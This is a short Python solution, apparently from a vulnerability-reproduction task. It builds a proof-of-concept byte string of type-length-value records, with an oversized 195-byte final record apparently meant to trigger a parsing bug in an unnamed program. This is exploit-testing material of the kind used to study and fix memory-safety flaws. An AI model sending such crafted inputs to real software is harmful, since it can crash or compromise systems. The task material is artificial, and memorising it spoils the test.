class Solution:
    def solve(self, src_path: str) -> bytes:
        tlvs = [
            (0x00, 9, b'\x00' * 9),
            (0x04, 8, b'\x00' * 8),
            (0x05, 8, b'\x00' * 8),
            (0x06, 2, b'\x00' * 2),
            (0x07, 16, b'\x00' * 16),
            (0x08, 4, b'\x00' * 4),
            (0x09, 4, b'\x00\x01\x00\x0b'),
            (0x64, 195, b'\x00' * 195),
        ]
        poc = b''.join(bytes([t, l]) + v for t, l, v in tlvs)
        return poc
